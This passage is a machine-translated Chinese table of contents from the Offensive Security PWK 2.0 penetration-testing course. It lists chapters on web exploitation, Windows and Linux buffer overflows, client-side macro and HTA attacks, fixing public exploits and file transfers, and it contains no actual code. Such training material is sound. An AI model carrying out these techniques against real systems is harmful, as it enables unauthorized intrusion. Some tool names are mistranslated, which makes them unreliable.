<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9808;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.1</font></font></nobr></div>
<div style="position:absolute;top:9808;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查 URL ...................................................... ………………………………………………………………………………………………………………………………………………………… ...................... 241</font></font></nobr></div>
<div style="position:absolute;top:9835;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.2</font></font></nobr></div>
<div style="position:absolute;top:9835;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查页面内容 ..................................... …………………………………………………………………………………………………………………………………………………………………… . 241</font></font></nobr></div>
<div style="position:absolute;top:9861;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.3</font></font></nobr></div>
<div style="position:absolute;top:9861;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看响应标头 ..................................... ...................................................... 245</font></font></nobr></div>
<div style="position:absolute;top:9888;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.4</font></font></nobr></div>
<div style="position:absolute;top:9888;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查站点地图 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 247</font></font></nobr></div>
<div style="position:absolute;top:9915;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.5</font></font></nobr></div>
<div style="position:absolute;top:9915;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定位管理控制台 ..................................... ...................................... 248</font></font></nobr></div>
<div style="position:absolute;top:9942;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9942;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序评估工具 ..................................... ...................................................... 248</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9969;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.2</font></font></nobr></div>
<div style="position:absolute;top:9969;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DIRB ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 249</font></font></nobr></div>
<div style="position:absolute;top:9996;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3</font></font></nobr></div>
<div style="position:absolute;top:9996;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打嗝套件 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 250</font></font></nobr></div>
<div style="position:absolute;top:10022;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.4</font></font></nobr></div>
<div style="position:absolute;top:10022;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尼克托 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 273</font></font></nobr></div>
<div style="position:absolute;top:10049;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10049;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用基于 Web 的漏洞 ..................................................... ...................................... 275</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10076;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1</font></font></nobr></div>
<div style="position:absolute;top:10076;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用管理控制台 ..................................... ...................................................... 275</font></font></nobr></div>
<div style="position:absolute;top:10103;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2</font></font></nobr></div>
<div style="position:absolute;top:10103;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跨站脚本 (XSS) ..................................... ……………………………………………………………………………………………………………………………………………………………… .. 297</font></font></nobr></div>
<div style="position:absolute;top:10130;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.3</font></font></nobr></div>
<div style="position:absolute;top:10130;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录遍历漏洞 ..................................... ...................................... 310</font></font></nobr></div>
<div style="position:absolute;top:10157;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4</font></font></nobr></div>
<div style="position:absolute;top:10157;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件包含漏洞 ..................................................... ...................................................... 312</font></font></nobr></div>
<div style="position:absolute;top:10184;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5</font></font></nobr></div>
<div style="position:absolute;top:10184;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL 注入 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 321</font></font></nobr></div>
<div style="position:absolute;top:10210;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10210;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外里程 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 343</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10237;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.5.1</font></font></nobr></div>
<div style="position:absolute;top:10237;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 344</font></font></nobr></div>
<div style="position:absolute;top:10264;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10264;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 344</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10291;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区溢出简介 ..................................... …………………………………………………………………………………………………………………………………………………………………… .. 345</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10318;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86 架构简介 ..................................... ...................................................... 345</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10345;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.1 程序存储器 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 345</font></font></nobr></div>
<div style="position:absolute;top:10371;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.2 CPU 寄存器 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 347</font></font></nobr></div>
<div style="position:absolute;top:10398;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区溢出演练 ..................................... ………………………………………………………………………………………………………………………………………………………… ... 349</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10425;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.1 易受攻击代码示例 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 350</font></font></nobr></div>
<div style="position:absolute;top:10452;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.2 免疫调试器介绍 ..................................... ...................................... 352</font></font></nobr></div>
<div style="position:absolute;top:10479;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.3 导航代码 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 357</font></font></nobr></div>
<div style="position:absolute;top:10505;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.4 缓冲区溢出 ..................................... ………………………………………………………………………………………………………………………………………………………… ........ 366</font></font></nobr></div>
<div style="position:absolute;top:10532;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.5 练习 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 368</font></font></nobr></div>
<div style="position:absolute;top:10559;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 368</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10586;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 缓冲区溢出 ..................................... ………………………………………………………………………………………………………………………………………………………… ………… 370</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10613;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现漏洞 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 370</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10640;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.1.1 对 HTTP 协议进行模糊测试 ..................................... …………………………………………………………………………………………………………………………………………………………………… . 370</font></font></nobr></div>
<div style="position:absolute;top:10666;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Win32 缓冲区溢出漏洞利用 ..................................... ...................................................... 376</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:10693;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.1 关于 DEP、ASLR 和 CFG 的一句话...................................... ...................................... 377</font></font></nobr></div>
<div style="position:absolute;top:10720;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.2 复制崩溃 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 377 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:10867;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:10900;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:11977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:11977;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:11977;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10996;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.3 控制 EIP ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 378</font></font></nobr></div>
<div style="position:absolute;top:11023;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.4 为我们的 Shellcode 定位空间 ..................................... ...................................... 381</font></font></nobr></div>
<div style="position:absolute;top:11049;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.5 检查坏字符 ..................................... ...................................................... 383</font></font></nobr></div>
<div style="position:absolute;top:11076;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.6 重定向执行流程 ..................................... ...................................................... 385</font></font></nobr></div>
<div style="position:absolute;top:11103;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.7 查找返回地址 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 385</font></font></nobr></div>
<div style="position:absolute;top:11130;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.8 使用 Metasploit 生成 Shellcode ..................................... ...................................... 389</font></font></nobr></div>
<div style="position:absolute;top:11157;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.9 获取 Shell ...................................... ………………………………………………………………………………………………………………………………………………………… ...................... 391</font></font></nobr></div>
<div style="position:absolute;top:11184;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.10</font></font></nobr></div>
<div style="position:absolute;top:11184;left:235"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改进漏洞利用 ..................................................... …………………………………………………………………………………………………………………………………………………………………… .. 395</font></font></nobr></div>
<div style="position:absolute;top:11210;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 395</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11237;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 缓冲区溢出 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 396</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11264;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 DEP、ASLR 和 Canary ...................................... …………………………………………………………………………………………………………………………………………………………………… ... 396</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11291;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制崩溃 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 396</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11318;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制 EIP ..................................... ………………………………………………………………………………………………………………………………………………………… …………………………………………………………………………………………………………………………………………………………………………</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11345;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们的 Shellcode 定位空间 ..................................... ...................................................... 401</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11372;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.5</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查坏字符 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 404</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11398;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.6</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找返回地址 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… ………… 405</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11425;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.7</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取一个 Shell ...................................... ...................................................... ...................................... 409</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11452;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.8</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 411</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11479;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 412</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11506;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解你的目标 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 412</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11533;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.1 被动客户端信息收集 ..................................... ...................................... 412</font></font></nobr></div>
<div style="position:absolute;top:11559;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.2 主动收集客户信息 ..................................... ...................................... 413</font></font></nobr></div>
<div style="position:absolute;top:11586;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用 HTML 应用程序 ..................................... ………………………………………………………………………………………………………………………………………………………… 421</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11613;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2.1 探索 HTML 应用程序 ..................................... ...................................................... 422</font></font></nobr></div>
<div style="position:absolute;top:11640;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2.2 HTA 攻击实战 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 425</font></font></nobr></div>
<div style="position:absolute;top:11667;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用 Microsoft Office ...................................... ………………………………………………………………………………………………………………………………………………………… ....... 426</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11693;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.1 安装 Microsoft Office ..................................... ...................................................... .. 426</font></font></nobr></div>
<div style="position:absolute;top:11720;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.2 Microsoft Word 宏 ..................................... ...................................................... ....... 428</font></font></nobr></div>
<div style="position:absolute;top:11747;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.3 对象链接和嵌入 ..................................... ...................................................... 433</font></font></nobr></div>
<div style="position:absolute;top:11774;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.4 躲避受保护的视图............................................................ ………………………………………………………………………………………………………………………………………………………… ...... 435</font></font></nobr></div>
<div style="position:absolute;top:11801;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 436</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11828;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定位公共漏洞...................................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 438</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11854;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告 ...................................................... ………………………………………………………………………………………………………………………………………………………… ...................... 438</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11881;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索漏洞...................................................... ………………………………………………………………………………………………………………………………………………………… ...................... 439</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:11908;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1 在线漏洞利用资源 ..................................... …………………………………………………………………………………………………………………………………………………………………… ... 439 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:12055;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12088;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:13165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:13165;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:13165;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12184;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.2 离线利用资源 ..................................... ………………………………………………………………………………………………………………………………………………………… ... 443</font></font></nobr></div>
<div style="position:absolute;top:12211;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将它们放在一起...................................................... …………………………………………………………………………………………………………………………………………………………………… …………………… 451</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12237;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 454</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12264;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修复漏洞...................................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 455</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12291;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修复内存损坏漏洞...................................................... ...................................................... 455</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12318;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.1 概述和注意事项 ..................................... ...................................................... 456</font></font></nobr></div>
<div style="position:absolute;top:12345;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.2 漏洞利用的导入和检查 ..................................... ...................................... 456</font></font></nobr></div>
<div style="position:absolute;top:12372;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.3 交叉编译漏洞利用代码 ..................................... ...................................................... 458</font></font></nobr></div>
<div style="position:absolute;top:12398;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.4 更改套接字信息 ..................................... ...................................... 459</font></font></nobr></div>
<div style="position:absolute;top:12425;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.5 更改返回地址 ..................................... ...................................................... 460</font></font></nobr></div>
<div style="position:absolute;top:12452;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.6 改变有效载荷 ..................................... ………………………………………………………………………………………………………………………………………………………… ………… 460</font></font></nobr></div>
<div style="position:absolute;top:12479;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.7 更改溢出缓冲区 ..................................... ...................................................... 467</font></font></nobr></div>
<div style="position:absolute;top:12506;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修复 Web 漏洞...................................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 469</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12533;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.1 考虑和概述 ..................................................... ………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………… 469</font></font></nobr></div>
<div style="position:absolute;top:12560;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.2 选择漏洞 ..................................... …………………………………………………………………………………………………………………………………………………………………… .. 469</font></font></nobr></div>
<div style="position:absolute;top:12586;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.3 更改连接信息 ..................................... ……………………………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:12613;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.4 排除“index out of range”错误...................................................... ...................... 474</font></font></nobr></div>
<div style="position:absolute;top:12640;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 476</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12667;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件传输 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 477</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12694;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑和准备...................................................... ...................................................... 477</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12721;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.1 转移攻击工具的危险 ..................................... ...................................... 477</font></font></nobr></div>
<div style="position:absolute;top:12747;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.2 安装 Pure-FTPd ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 477</font></font></nobr></div>
<div style="position:absolute;top:12774;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.3 非交互式 Shell ..................................... ………………………………………………………………………………………………………………………………………………………… …… 478</font></font></nobr></div>
<div style="position:absolute;top:12801;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Windows 主机传输文件 ..................................... ...................................... 480</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:12828;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.1 非交互式 FTP 下载 ..................................... ...................................................... 480</font></font></nobr></div>
<div style="position:absolute;top:12855;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.2 使用脚本语言下载 Windows ...................................... ……………… 482</font></font></nobr></div>
<div style="position:absolute;top:12881;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.3 使用 exe2hex 和 PowerShell 下载 Windows ...................................... ...... 485</font></font></nobr></div>
<div style="position:absolute;top:12908;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.4 使用 Windows 脚本语言的 Windows 上传 ..................................... . 486</font></font></nobr></div>
